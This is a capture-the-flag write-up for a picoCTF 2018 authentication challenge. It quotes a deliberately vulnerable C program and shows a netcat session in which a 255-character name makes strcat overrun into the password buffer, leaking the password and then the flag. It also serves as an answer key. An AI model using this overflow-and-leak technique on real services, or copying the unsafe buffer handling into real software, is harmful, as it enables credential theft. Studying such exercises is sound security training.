## Question
>Can you authenticate to this [service](//2018shell.picoctf.com/static/0bb8663a6d82ba0c5d07f06e357c22ca/auth) and get the flag? Connect with `` nc 2018shell.picoctf.com 31045 ``. [Source](//2018shell.picoctf.com/static/0bb8663a6d82ba0c5d07f06e357c22ca/auth.c).

### Hint
>Are all the system calls being used safely?
>Some people can have reallllllly long names you know..

## Solution
Lets look at the source code for auth:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}


int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  // real pw: 
  FILE *file;
  char password[64];
  char name[256];
  char password_input[64];
  
  memset(password, 0, sizeof(password));
  memset(name, 0, sizeof(name));
  memset(password_input, 0, sizeof(password_input));
  
  printf("What is your name?\n");
  
  fgets(name, sizeof(name), stdin);
  char *end = strchr(name, '\n');
  if (end != NULL) {
    *end = '\x00';
  }

  strcat(name, ",\nPlease Enter the Password.");

  file = fopen("password.txt", "r");
  if (file == NULL) {
    printf("Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(password, sizeof(password), file);

  printf("Hello ");
  puts(name);

  fgets(password_input, sizeof(password_input), stdin);
  password_input[sizeof(password_input)] = '\x00';
  
  if (!strcmp(password_input, password)) {
    flag();
  }
  else {
    printf("Incorrect Password!\n");
  }
  return 0;
}
```
We can see that after loading the name string into `name` of size `256 bytes` the program replaces the newline terminator (`\n`) with a NULL terminator (`\x00`) and adds a `27 bytes` string to the end of `name`, so if we enter a `255 bytes` long string to `name` `strcat()` will store the rest of the bytes in `password` followed by a NULL terminator.
```c
  printf("What is your name?\n");
  
  fgets(name, sizeof(name), stdin);
  char *end = strchr(name, '\n');
  if (end != NULL) {
    *end = '\x00';
  }

  strcat(name, ",\nPlease Enter the Password.");
```
And since we don't have a NULL terminator inside of `name` anymore, printing `name` will result in printing until the next buffer - `password` which as a NULL terminator at its end because it was just loaded into `password`.
```c
  strcat(name, ",\nPlease Enter the Password.");

  file = fopen("password.txt", "r");
  if (file == NULL) {
    printf("Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(password, sizeof(password), file);

  printf("Hello ");
  puts(name);
```
BONUS: The password seperates with a comma (,) in the end of the output because we added the string `,\nPlease Enter the Password.` which starts with a comma to a `256 bytes` string containing `255 bytes` so the comma is left in place of the NULL terminator.
```bash
$ nc 2018shell.picoctf.com 31045
What is your name?
pxvqeweozozwuvmmbvoiuvbfsewllxjdaotrptqslqsdlncvoqhtlstuwpxzasccfwvfbvwhfvxdcxuebaxuppsivzuawqstnqypsxusuzoqupryvsyzuhmpenkcavlpceplzfmegfapbbnghwfdstyfdilemsryoznqzfzqfttphwoczeueqhxjfjhqthrnnbacoxgcxpyyzjyguifixnhhbdlpxiwxbfbgwlnbxshbjykvlbwlciqattakmqe
Hello pxvqeweozozwuvmmbvoiuvbfsewllxjdaotrptqslqsdlncvoqhtlstuwpxzasccfwvfbvwhfvxdcxuebaxuppsivzuawqstnqypsxusuzoqupryvsyzuhmpenkcavlpceplzfmegfapbbnghwfdstyfdilemsryoznqzfzqfttphwoczeueqhxjfjhqthrnnbacoxgcxpyyzjyguifixnhhbdlpxiwxbfbgwlnbxshbjykvlbwlciqattakmqe,a_reAllY_s3cuRe_p4s$word_d98e8d
```
Let's start a new connection and use the password we just leaked (`a_reAllY_s3cuRe_p4s$word_d98e8d`) inorder to get the flag!
```bash
$ nc 2018shell.picoctf.com 31045
What is your name?
Yuval
Hello Yuval,
Please Enter the Password.
a_reAllY_s3cuRe_p4s$word_d98e8d
picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}
```

### Flag
`picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}`
